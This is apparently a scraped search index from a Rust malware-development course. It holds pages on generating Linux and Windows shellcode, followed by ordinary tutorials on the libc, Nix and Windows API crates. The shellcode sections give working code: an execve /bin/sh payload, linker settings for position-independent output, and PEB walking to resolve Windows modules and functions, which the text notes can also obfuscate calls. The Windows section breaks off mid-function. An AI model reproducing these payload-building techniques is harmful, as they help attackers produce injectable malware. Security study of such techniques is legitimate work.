https://nu11busters.github.io/rust-maldev-course/shellcode/generate-shellcode-for-linux/":{"body":"We're going to look at how to generate shellcode for Linux from code written in Rust.\nWe'll be basing ourselves on a technique developed by Sylvain Kerkour, which consists in producing completely independent code (PIC) and extracting the code from the binary with \"objcopy\".\nFor our example, we're going to develop a shellcode that will simply execute a shell with \"/bin/sh\". To do this, we're going to use the \"execve\" system call, the documentation for which can be found here: https://x64.syscall.sh/\nHere's the content of our Rust code:\n# src/main.rs\n\n#![no_std]\n#![no_main]\n\nuse core::arch::asm;\n\n#[cfg(not(test))]\n#[panic_handler]\nfn panic(_: &amp;core::panic::PanicInfo) -&gt; ! {\n    loop {}\n}\n\n#[no_mangle]\nunsafe fn _start() {\n    asm!(\n        \"syscall\",\n        in(\"rax\") 59,\n        in(\"rdi\") \"/bin/sh\\0\".as_ptr(),\n        in(\"rsi\") 0,\n        in(\"rdx\") 0,\n    );\n}\n\nHere, we start by telling Cargo that we're going to compile our program without the standard library, which is essential if we're to obtain independent code.\nWe then rename our main function \"_start\", as this is the real entry point into Linux.\nNext, we call the \"syscall\" assembly instruction, placing the right values in the right registers according to the documentation:\n\nThe code is relatively simple, but now we need to fill in some additional configurations for Cargo to produce a valid binary:\n# .cargo/config.toml\n\n[build]\nrustflags = [\n    \"-C\", \"link-arg=-nostdlib\", \n    \"-C\", \"link-arg=-static\", \n    \"-C\", \"link-arg=-Wl,-T./shellcode.ld,--build-id=none\", \n    \"-C\", \"relocation-model=pic\"\n]\n\nThese parameters tell Cargo to produce a PIC (Position Independent Code) and the linker to use the section layout configured in the \"shellcode.ld\" file:\n# shellcode.ld\n\nENTRY(_start);\n\nSECTIONS\n{\n\t. = ALIGN(16);\n\t.text :\n\t{\n\t\t*(.text.prologue)\n\t\t*(.text)\n\t\t*(.rodata)\n\t}\n\t.data :\n\t{\n\t\t*(.data)\n\t}\n\n\t/DISCARD/ :\n\t{\n\t\t*(.interp)\n\t\t*(.comment)\n\t\t*(.debug_frame)\n\t}\n}\n\nHere, we merge the \"rodata\" section, which contains the static variables, with the \"text\" section, which contains the code, so that our shellcode can read its variables independently.\nAll that remains is to compile our code to produce the shellcode, by compiling our program with the \"cargo build --release\" command, then we just have to extract the shellcode using the following command:\nobjcopy -O binary shellcode/target/release/shellcode shellcode.bin\nYou can then load the \"shellcode.bin\" file into your favorite loader:\n\nConclusion🔗\nNow you've got all you need to generate shellcode for Linux.\n","id":" https://nu11busters.github.io/rust-maldev-course/shellcode/generate-shellcode-for-linux/","title":"Generate shellcode for Linux"}," https://nu11busters.github.io/rust-maldev-course/shellcode/generate-shellcode-for-windows/":{"body":"We're going to take a look at shellcode generation by programming the code ourselves in Rust. This will give us greater flexibility than if we were to use shellcodes pre-made by \"msfvenom\", for example.\nHere we're going to use a technique published by b1tg which consists of two projects, one for compiling a binary and the other for parsing the binary, extracting the \".text\" section which contains the code, then patching the first instructions to force the shellcode to jump directly to the beginning of our code, which is filled in the headers of the PE file.\nHere's the structure of our source code: \n.\n├── Cargo.lock\n├── Cargo.toml\n├── shellcode\n│ ├── .cargo\n│ └── config.toml\n│ ├── Cargo.lock\n│ ├── Cargo.toml\n│ └── src\n│ ├── binds.rs\n│ └── main.rs\n└── src\n └── main.rs\n\nThe code that generates the shellcode from the binary is located in \"src/main.rs\", but we won't look at its contents, but you'll find it in the course source files. But how it works is easy to summarize: it will read the \"shellcode.exe\" file generated in the neighboring \"shellcode\" folder, then it will read the \"entry point\" field in the headers of the PE (Portable Executable) file containing the address where our code starts, then it will modify the first instructions of the \".text\" section containing all our code, to insert a \"jmp\" instruction with the value of our entry point.\nInstead, we'll look at the \"shellcode\" folder, which contains the code to generate a valid shellcode, starting with the \"shellcode/.cargo/config.toml\" file:\n# shellcode/.cargo/config.toml\n\n[build]\ntarget = \"x86_64-pc-windows-msvc\"\n\nrustflags = [\n    \"-Z\", \"pre-link-arg=/NODEFAULTLIB\",\n    \"--emit\", \"asm\",\n    \"-C\", \"link-arg=/ENTRY:main\",\n    \"-C\", \"link-arg=/MERGE:.edata=.rdata\",\n    \"-C\", \"link-arg=/MERGE:.rustc=.data\",\n    \"-C\", \"link-arg=/MERGE:.rdata=.text\",\n    \"-C\", \"link-arg=/MERGE:.pdata=.text\",\n    \"-C\", \"link-arg=/DEBUG:NONE\",\n    \"-C\", \"link-arg=/EMITPOGOPHASEINFO\",\n    \"-C\", \"target-feature=-mmx,-sse,+soft-float\"\n]\n\nThis is where we make a number of arrangements to turn the section into a functional shellcode, mainly by adding the \"rdata\" and \"pdata\" sections to the \".text\" section so that all the code is independent (known as PIC for Position Independent Code). The other configurations are specifically designed to remove unnecessary data from the code.\nNext, concerning the source code, the \"shellcode/src/binds.rs\" file contains all the data structures used to interact with the Windows API.\nWe'll now analyze the contents of our program.\nHow to call the Windows API🔗\nTo call the Windows API, we're going to use a technique that could also be used to obfuscate function calls, namely to take advantage of the PEB (for Process Environment Block) that we can retrieve independently from memory.\nThe PEB is a data structure containing a whole range of information about the running process, including executable base addresses, process parameters, environment variables and more.\nWhat interests us in this part of the course is one of the PEB fields called \"Ldr\", which lists the dynamic library instances loaded into memory by the process.\nIn our example, our shellcode will simply execute a shell by creating a new process with the \"cmd.exe\" program.\nProgramming without a standard library🔗\nA Rust program without a library consists of removing all the code contained in the \"std\" library, and replacing it with the \"core\" library, which makes no assumptions about the system it's compiling on.\nAs a result, we lose a large part of the code in our binary, since we lose all abstractions to the operating system. We also lose access to many external libraries that depend on the stand library.\nTo instruct Cargo that we want to program without the standard library, we need to add these lines of code to our program:\n# shellcode/src/main.rs\n\n#![feature(lang_items)]\n#![no_main]\n#![no_std]\n\n#[panic_handler]\nfn panic(_panic: &amp;PanicInfo&lt;'_&gt;) -&gt; ! {\n    loop {}\n}\n\n#[lang = \"eh_personality\"]\n#[no_mangle]\nexternal \"C\" fn eh_personality() {}\n\n#[export_name = \"_fltused\"]\nstatic _FLTUSED: i32 = 0;\n\n#[no_mangle]\nextern \"C\" fn main() {\n    ...\n}\n\nThe global macro \"#![no_std]\" tells Cargo to use the \"core\" library instead of \"std\".\nThe macro \"#![no_main]\" tells Cargo not to use the \"main\" function as an entry point for the program, something that was only possible with the standard library.\nNext, we'll have to define our own \"panic_handler\", which defines the behavior when the program panics. In our case, we don't want it to do anything, so we'll let it run in a loop.\nThen we need to define the \"eh_personality\" function, which is executed when our program panics - in our case, we just want it to stop right away.\nThe \"_fltused\" symbol is requested by the Windows MSVC compiler when we use float values, normally handled by the standard library.\nFinally, we need to define our program's entry point, which is a Windows-specific prototype.\nRetrieving the ILL🔗\nTo retrieve the PEB address in a completely autonomous way, we use this function :\n# shellcode/src/main.rs\n\n...\nlet peb: *mut PEB;\nasm!(\n    \"mov {}, gs:[0x60]\",\n    out(reg) peb,\n);\n...\n\nThe assembler instruction will retrieve the value in the \"gs\" segment register at offset 0x60 and store it in our \"offset\" variable. This value contains the address of the PEB. The reason we can retrieve it like this is that the PEB is located in another data structure called TEB (for Thread Environment Block), which is stored in the \"gs\" segment register at offset 0x30.\nTo access PEB values, we'll cast the \"peb\" variable into a PEB pointer (structure defined in the \"binds.rs\" file).\nRetrieving a module🔗\nThe following code will be used to retrieve a HANDLE to an instance of a module loaded in memory from its UTF-16 encoded name (which amounts to redeveloping the Windows API GetModuleHandleW function):\n# shellcode/src/main.rs\n\nfn get_module_by_name(module_name: *const u16) -&gt; PVOID {\n    let peb: *mut PEB;\n    unsafe {\n        asm!(\n            \"mov {}, gs:[0x60]\",\n            out(reg) peb,\n        );\n        let ldr = (*peb).Ldr;\n        let list_entry = &amp;((*ldr).InLoadOrderModuleList);\n        let mut cur_module: *const LDR_DATA_TABLE_ENTRY = (&amp;list_entry as *const _) as *const _;\n        loop {\n            let cur_name = (*cur_module).BaseDllName.Buffer;\n            if !cur_name.is_null() {\n                if compare_raw_str(module_name, cur_name) {\n                    return (*cur_module).BaseAddress;\n                }\n            }\n            let flink = (*cur_module).InLoadOrderModuleList.Flink;\n            cur_module = flink as *const LDR_DATA_TABLE_ENTRY;\n        }\n    }\n}\n\nHere, we'll analyze the contents of the \"Ldr\" contained in the PEB, then iterate over all the modules loaded in memory, each time comparing the name of the module with our input to see if it's the one we're looking for.\nWhen it's found, we return the address of its instance in memory.\nRetrieving a function🔗\nWe're now going to develop the function that will enable us to retrieve a function's pointer from its symbol name (which amounts to redeveloping the GetProcAddress function of the Windows API):\n# shellcode/src/main.rs\n\nfn get_func_by_name(module: PVOID, func_name: *const u8) -&gt;

You can find a list of these features on docs.rs.\nIn this section, we'll look at how to use the two crates through three simple examples.\nUsage🔗\nTo include one of the crates in a project, simply add the crate to the dependencies in the Cargo.toml file, as in the case of the libc crate:\n[dependencies]\nlibc = \"0.2.150\"\n\nFor this same crate, it is possible to use it without using the standard library (std).\nTo do so, you need to specify the absence of default features (and possibly activate the other features one by one):\n[dependencies]\nlibc = { version = \"0.2.150\", default-features = false }\n\nRetrieving the user and group with which the program is running🔗\nYou can retrieve the user and group with which the process is running using the geteuid function and the getegid function respectively.\nUsing the libc crate:\nextern crate libc;\n\nfn main() {\n&nbsp;&nbsp;&nbsp; unsafe {\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; let uid = libc::geteuid();\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; println!(\"Current user's UID: {}\", uid);\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; let gid = libc::getegid();\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; println!(\"GID of current group: {}\", gid);\n&nbsp;&nbsp;&nbsp; }\n}\n\nFor the Nix crate, the code is virtually the same except for the absence of the unsafe block:\nextern crate nix;\nuse nix::unistd::{geteuid, getegid};\nfn main() {\n&nbsp;&nbsp;&nbsp; let uid = geteuid();\n&nbsp;&nbsp;&nbsp; println!(\"Current user's UID: {}\", uid);\n\n&nbsp;&nbsp;&nbsp; let gid = getegid();\n&nbsp;&nbsp;&nbsp; println!(\"GID of current group: {}\", gid);\n}\n\nNote that you need to use the user feature to access both functions.\nDisplaying the current directory🔗\nIn this example, we'll see how to retrieve the current directory by specifying the buffer where the string will be stored, passing it by reference.\nextern crate libc;\n\nfn main() {\n&nbsp;&nbsp;&nbsp; unsafe {\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; let mut buffer: [libc::c_char; libc::PATH_MAX as usize] = [0; libc::PATH_MAX as usize];\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if libc::getcwd(buffer.as_mut_ptr(), buffer.len() as libc::size_t).is_null() {\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eprintln!(\"Erreur lors de l'obtention du répertoire de travail actuel\");\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } else {\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; let cwd = std::ffi::CStr::from_ptr(buffer.as_ptr());\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; println!(\"Répertoire de travail actuel : {:?}\", cwd);\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }\n&nbsp;&nbsp;&nbsp; }\n}\n\nYou can see that we're using an array with the size libc::PATH_MAX and initialized to 0, just as you'd find in C.\nThe std::ffi::CStr::from_ptr function allows you to convert the string and more securely use the return string as it comes from a function written in C.\nThe version using the Nix crate is considerably simpler:\nextern crate nix;\n\nuse nix::unistd::getcwd;\n\nfn main() {\n&nbsp;&nbsp;&nbsp; match getcwd() {\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Ok(cwd) =&gt; {\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; let current_dir = cwd.to_string_lossy();\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; println!(\"Current working directory: {}\", current_dir);\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Err(_) =&gt; {\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eprintln!(\"Could not get current working directory.\");\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }\n&nbsp;&nbsp;&nbsp; }\n}\n\nThe feature required to use the getcwd function is fs.\nTCP socket🔗\nHere's how to create a TCP socket using the libc crate to connect to address 127.0.0.1:12345 (works on x86 or x64 systems):\nextern crate libc;\nuse std::net::Ipv4Addr;\n\nfn main() {\n&nbsp;&nbsp;&nbsp; unsafe {\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // Create a TCP socket (SOCK_STREAM)\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; let socket_fd = libc::socket(libc::AF_INET, libc::SOCK_STREAM, 0);\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if socket_fd == -1 {\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eprintln!(\"Error during socket creation\");\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return;\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // Fills struct sockaddr_in with server address (here '127.0.0.1:12345')\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; let mut server_address: libc::sockaddr_in = std::mem::zeroed();\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; server_address.sin_family = libc::AF_INET as libc::sa_family_t;\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; server_address.sin_addr.s_addr = u32::from_le_bytes(\"127.0.0.1\".parse::&lt;Ipv4Addr&gt;().unwrap().octets());\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; server_address.sin_port = u16::to_be(12345);\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // connect system call\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if libc::connect(\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; socket_fd,\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &amp;server_address as *const _ as *const libc::sockaddr,\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; std::mem::size_of_val(&amp;server_address) as libc::socklen_t,\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ) == -1\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eprintln!(\"Could not connect\");\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; libc::close(socket_fd);\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return;\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; println!(\"Connected to 127.0.0.1:12345\");\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // Close connection\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; libc::close(socket_fd);\n&nbsp;&nbsp;&nbsp; }\n}\n\nYou can see that the htons and inet_addr functions are not used when creating the sockaddr_in structure.\nThis is because they are not available in the crate, so you have to use other language functions to achieve the same result.\nHere, we retrieve the IP address required in s_addr by converting the IP address into an IPv4Addr, available in the std::net library, then retrieving the bytes that make it up to form a u32. You can replace the u32::from_le_bytes function with u32::from_be_bytes on big-endian systems like ARM.\nTo get the port in the right format, convert the port number into a u16 in big-endian.\nThe Nix version is much simpler:\nextern crate nix;\n\nuse std::os::fd::AsRawFd;\nuse nix::sys::socket::{socket, connect, AddressFamily, SockType, SockaddrIn};\n\nfn main() {\n&nbsp;&nbsp;&nbsp; // Create a TCP socket\n&nbsp;&nbsp;&nbsp; let socket_fd = socket(\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; AddressFamily::Inet,\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SockType::Stream,\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; nix::sys::socket::SockFlag::empty(),\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; None,\n&nbsp;&nbsp;&nbsp; );\n\n&nbsp;&nbsp;&nbsp; match socket_fd {\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Ok(fd) =&gt; {\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // Set IP address and port\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; let server_addr = SockaddrIn::new(127, 0, 0, 1, 12345);\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // Connect to the server\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; match connect(fd.as_raw_fd(), &amp;server_addr) {\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Ok(_) =&gt; {\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; println!(\"Connected to 127.0.0.1:12345\");\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Err(e) =&gt; {\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eprintln!(\"Server connection error : {}\", e);\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Err(e) =&gt; {\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eprintln!(\"Could not create socket : {}\", e);\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }\n&nbsp;&nbsp;&nbsp; }\n}\n\nAs you can see, no type conversions are required. The use of file descriptors defined in the os module of the standard library clearly shows how the libc fits into the language thanks to Nix, whereas the crate libc simply exposes the functions.\nConclusion\nIn conclusion, the crate libc in Rust is a simple interface to the standard C library. It is particularly useful for low-level operations and interoperability with C code, which is very useful for malware development.\nThe Nix crate is a wrapper around the library, facilitating development in Rust as well as program stability.\nFor detailed information on a libc function, you can consult the man-pages available on any Linux system. They provide detailed documentation of standard library functions.\nTo consult a man-page, use the command man followed by the function name. For example, to obtain information on the malloc function, you can run man malloc in the terminal.\nThere are also many online resources providing man-pages, which can be useful. You can find online versions on sites such as man7.\n","id":" https://nu11busters.github.io/rust-maldev-course/system/libc-api/","title":"Libc API"}," https://nu11busters.github.io/rust-maldev-course/system/windows-api/":{"body":"Introduction🔗\nThere are several crates available for interacting with the Windows API.\nThe first is the winapi crate.\nHowever, this crate is deprecated as it has not been updated since November 6, 2021.\nThe second is the windows crate developed by Microsoft, which is divided into 2 main crates:\n\nwindows\nwindows-sys\n\nThe windows-sys crate directly exposes API functions and structs, while the windows crate encompasses the API with an overlay to simplify its use with Rust.\nTo demonstrate the difference, here's a tangible example using the WinSock API:\nIn the windows library ([https://github.com/microsoft/windows-rs/blob/master/crates/libs/windows/src/Windows/Win32/Networking/MAX_PREFERRED_LENGTH WinSock/mod.rs](https://github.com/microsoft/windows-rs/blob/master/crates/libs/windows/src/Windows/Win32/Networking/MAX_PREFERRED_LENGTH WinSock/mod.rs)), line 12062 shows the implementation of the fmt trait for the SOCKET_SECURITY_SETTINGS_IPSEC structure, which is not the case in the windows-sys crate (https://github.com/microsoft/windows-rs/blob/master/crates/libs/sys/src/Windows/Win32/Networking/WinSock/mod.rs##L5294).\nThe link macro is declared in the crates/libs/targets/src/lib.rs file.\nThe argument put forward by Microsoft for the use of the windows-sys crate is compilation time, but as this argument is not important in this course, we will use the windows crate in this section.\nYou can find the crate documentation on this site.\nPreparing the environment🔗\nTo include the crate in a project, add the crate to the dependencies in the cargo.toml file, for example:\n[dependencies]\nwindows-sys = \"0.52.0\"\n\nHowever, as the Windows API is so extensive in terms of functionality, this crate has many features. You can find them at docs.rs.\nEach feature used in the examples will be indicated.\nExamples🔗\nGet user name and group🔗\nIn this first example, we'll see how to retrieve the user name and group of the user who launched the program.\nuse windows::Win32::System::WindowsProgramming::GetUserNameA;\nuse windows::Win32::NetworkManagement::NetManagement::NetUserGetLocalGroups;\nuse windows::Win32::NetworkManagement::NetManagement::LG_INCLUDE_INDIRECT;\nuse windows::core::{PSTR, PCWSTR};\nuse windows::Win32::NetworkManagement::NetManagement::LOCALGROUP_USERS_INFO_0;\nuse windows::Win32::System::Diagnostics::Debug::{FORMAT_MESSAGE_FROM_SYSTEM, FORMAT_MESSAGE_IGNORE_INSERTS};\nuse windows::Win32::System::Diagnostics::Debug::FormatMessageA;\nuse windows::Win32::NetworkManagement::NetManagement::UNLEN;\nuse windows::Win32::NetworkManagement::NetManagement::MAX_PREFERRED_LENGTH;\nuse windows::Win32::NetworkManagement::NetManagement::NetApiBufferFree;\nuse std::ffi::CStr;\nuse std::ptr;\nuse std::ffi::c_void;\n\nfn main() {\n    let mut username_buf = vec![0u8; (UNLEN+1) as usize]; // creation of the buffer containing the user name\n    let mut username_len: u32 = UNLEN+1;\n\n    unsafe {\n        let _ = GetUserNameA(PSTR {0: username_buf.as_mut_ptr()}, &amp;mut username_len);\n        let username_str = CStr::from_ptr(username_buf.as_mut_ptr() as *const i8).to_str().unwrap();\n        println!(\"Current user: {}\", username_str);\n    }\n\n\n    for i in (0..username_buf.len()).step_by(2) { // converts user name to utf-16\n        username_buf.insert(i + 1, 0x00);\n    }\n\n    let res: u32;\n\n    let mut groups_ptr: *mut u8 = ptr::null_mut();\n    let mut entriesread: u32 = 0;\n    let mut totalentries: u32 = 0;\n    unsafe {\n        res = NetUserGetLocalGroups(\n            PCWSTR::null(), // local computer\n            PCWSTR {\n                0: username_buf.as_ptr() as *const u16\n            },\n            0,\n            LG_INCLUDE_INDIRECT,\n            &amp;mut groups_ptr as *mut *mut u8,\n            MAX_PREFERRED_LENGTH,\n            &amp;mut entriesread,\n            &amp;mut totalentries,\n        );\n    }\n\n    if res != 0 {\n        let mut err_msg_buffer: Vec&lt;u8&gt; = Vec::with_capacity(MAX_PREFERRED_LENGTH as usize);\n        unsafe {\n            FormatMessageA(\n                FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,\n                None,\n                res,\n                0,\n                PSTR {\n                    0: err_msg_buffer.as_mut_ptr()\n                },\n                MAX_PREFERRED_LENGTH as u32,\n                None\n            );\n            eprint!(\"Unable to retrieve user group: {}\", CStr::from_ptr(err_msg_buffer.as_mut_ptr() as *const i8).to_str().unwrap());\n            NetApiBufferFree(Some(groups_ptr as *const c_void));\n        }\n        return ();\n    }\n\n    println!(\"User groups:\");\n    unsafe {\n        let group_info: *const LOCALGROUP_USERS_INFO_0 = groups_ptr as *const LOCALGROUP_USERS_INFO_0;\n        for i in 0..entriesread {\n            let group_name = &amp;(*group_info.offset(i as isize)).lgrui0_name;\n            println!(\"- {}\", group_name.to_string().unwrap());\n        }\n        NetApiBufferFree(Some(groups_ptr as *const c_void));\n    }\n}\n\nFunctions used🔗\nIn this example, we use the functions GetUserNameA and NetUserGetLocalGroups.\nThe parameters for the GetUserNameA function are:\n\nlbpbuffer: A pointer to a buffer containing the string representing the user name. The pointer is of type PSTR, which is a type defined in WinAPI, and is a pointer to an ANSI string terminated by a null character ('\\0'). This parameter is similar to a pointer to a C string (a char**). The maximum size of a username is UNLEN, which is 256. As indicated in the documentation, a buffer of size UNLEN+1 can contain any username, the +1 being for the null character.\npcbbuffer: This parameter has a dual function: when passed as a parameter to the function, it contains the size of the buffer that will hold the character string (passed in the lbpbuffer parameter). Once the function has been executed, the variable contains the size of the username plus the null character (the number of characters written in the buffer, in short). This double functionality is indicated in Microsoft documentation by the words [in, out] to the left of the pcbbuffer parameter name.\n\nThis function may fail if the buffer is too small to hold the username, in which case it returns 0 and you need to use the GetLastError function to retrieve the error name. In this program, we have a buffer large enough to hold any user name.\nThe parameters for the NetUserGetLocalGroups function are:\n\nservername: A pointer to a buffer which is a string encoded in UTF-16 indicating the name of the server on which we wish to execute the function. This string must be a constant, but this is not necessary here. The pointer is of type PCWSTR. However, as explained in the documentation, we give a pointer to null using PCWSTR::null() to indicate that we wish to execute the function on the local computer.\nusername: A pointer to a buffer which is a string encoded in UTF-16 indicating the username whose groups we wish to retrieve. As with servername, this parameter is of type PCWSTR.\nlevel: A 32-bit unsigned integer (u32) indicating the level of information to be retrieved. In the context of this function, level 0 is the only level that can be used, indicating that basic information on local groups is required.\nflags: A 32-bit unsigned integer (u32) specifying control flags. In this case, LG_INCLUDE_INDIRECT is often used, indicating that indirect groups (groups to which the user belongs via other groups) should also be included in the result.\nbufptr: A pointer to an uninitialized buffer where groups will be stored. Here the type is *mut *mut u8, which can be seen as a char** in C. Here the result is converted into LOCALGROUP_USERS_INFO_0, which is a list of structures containing the groups. What interests us in these structures is the LUID, which we'll see later.\nprefmaxlen: A 32-bit unsigned integer (u32) specifying the preferred buffer size initialized by the API. If the specified size is too small to receive the information, the function will return ERROR_MORE_DATA, and prefmaxlen will be updated with the required size, which can be handy in some cases. Here we use the constant MAX_PREFERRED_LENGTH, which indicates that we wish to have as much information as possible in the buffer.\nentriesread: A pointer to a 32-bit unsigned integer (*mut u32) which will receive the number of entries read, in this case the number of groups.\ntotalentries: This is a pointer to a 32-bit unsigned integer (*mut u32) which contains the number of entries that could have been returned, in this case we want the totality of information.\n\nThis function can also fail, in which case it returns an error code. It is possible to have this error code as a character string using the FormatMessageA function.\nThis function takes as parameter:\n\ndwflags: bitflags indicating what we wish to display, here thanks to the FORMAT_MESSAGE_FROM_SYSTEM and FORMAT_MESSAGE_IGNORE_INSERTS flags, we retrieve the raw character string from the system.\nlpsource: the message location, not used here.\ndwmessageid: A 32-bit unsigned integer (u32) representing the error identifier whose string representation we wish to retrieve. Here we pass the result of the NetUserGetLocalGroups function.\ndwlanguageid: A 32-bit unsigned integer (u32) representing which language the string will be in. Here we specify 0 for the system language.\nlpbuffer: A pointer to a buffer that will contain the string representing the error. The pointer is of type PSTR.\nnsize: A 32-bit unsigned integer (u32) containing the size of the buffer passed in the lpbuffer argument.\nArguments: List of values used when formatting the message. This can be thought of as the arguments passed to prinln! after the first parameter. Here, we're not doing any formatting, so we don't put anything.\n\nCode explanations🔗\nAs you can see from the above description of the function parameters, the GetUserNameA function returns the username in ANSI, whereas the NetUserGetLocalGroups function requests the username encoded in UTF-16. This encoding difference is addressed by the following code, which adds a null character between each ANSI character in the username:\nfor i in (0..username_buf.len()).step_by(2) {\n    username_buf.insert(i + 1, 0x00);\n}\n\nIn the last part of the program, we have this part displaying the groups as strings:\nlet group_info: *const LOCALGROUP_USERS_INFO_0 = groups_ptr as *const LOCALGROUP_USERS_INFO_0;\nfor i in 0..entriesread {\n    let group_name = &amp;(*group_info.offset(i as isize)).lgrui0_name;\n    println!(\"- {}\", group_name.to_string().unwrap());\n}\n\nIn this code, we retrieve the group name using the lgrui0_name attribute, which is of type PWSTR. However, as we're retrieving a pointer to an array, we need 